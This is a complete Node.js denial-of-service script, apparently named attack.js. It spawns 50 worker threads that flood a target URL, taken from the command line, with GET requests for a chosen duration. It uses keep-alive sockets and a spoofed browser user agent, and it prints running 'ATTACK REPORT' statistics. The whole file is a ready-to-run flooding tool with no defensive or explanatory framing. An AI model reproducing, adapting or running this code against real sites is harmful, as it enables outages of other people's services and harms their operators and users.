const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');

// Main Thread
if (isMainThread) {
    const target = process.argv[2]; // Target URL
    const duration = parseInt(process.argv[3], 10); // Duration in seconds

    if (!target || !duration || isNaN(duration)) {
        console.log('Usage: node attack.js <target> <duration_in_seconds>');
        process.exit(1); // Ensure that we exit if arguments are incorrect
    }

    const numThreads = 50; // Set threads to 50
    let totalSent = 0;
    let totalSuccess = 0;

    // Spawn 50 worker threads
    for (let i = 0; i < numThreads; i++) {
        const worker = new Worker(__filename, {
            workerData: { target, duration }
        });

        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                totalSent += msg.sent;
                totalSuccess += msg.success;
            }
        });

        worker.on('exit', () => {
            console.log(`Worker exited`);
        });
    }

    // Stats Update
    const statsInterval = setInterval(() => {
        console.clear();
        console.log('=== ATTACK REPORT ===');
        console.log('Total sent:', totalSent);
        console.log('Success:', totalSuccess);
    }, 1000);

    // Final report after the attack duration
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log('\n=== FINAL REPORT ===');
        console.log('Total sent:', totalSent);
        console.log('Success:', totalSuccess);
        process.exit(0);
    }, duration * 1000);

// Worker Thread
} else {
    const { target, duration } = workerData;
    const endTime = Date.now() + duration * 1000; // Attack duration end time
    const parsedUrl = new URL(target);
    const protocol = parsedUrl.protocol === 'https:' ? https : http;

    const agent = new protocol.Agent({
        keepAlive: true,
        maxSockets: 500
    });

    let sent = 0;
    let success = 0;

    // Request function
    function floodOnce() {
        if (Date.now() >= endTime) {
            parentPort.postMessage({ type: 'stats', sent, success });
            return;
        }

        // Request setup
        const req = protocol.request({
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'GET',
            agent,
            headers: {
                Host: parsedUrl.hostname,
                Connection: 'keep-alive',
                Accept: '*/*',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            }
        }, (res) => {
            if (res.statusCode < 400) success++;
            res.resume(); // Consume the response body
        });

        req.on('error', () => {}); // Ignore request errors
        req.end(); // End the request
        sent++; // Increment sent count

        // Send stats back to main thread periodically
        if (sent % 1000 === 0) {
            parentPort.postMessage({ type: 'stats', sent: 1000, success });
            success = 0;
        }

        // Yield to event loop for non-blocking behavior
        setImmediate(floodOnce);
    }

    floodOnce();
}
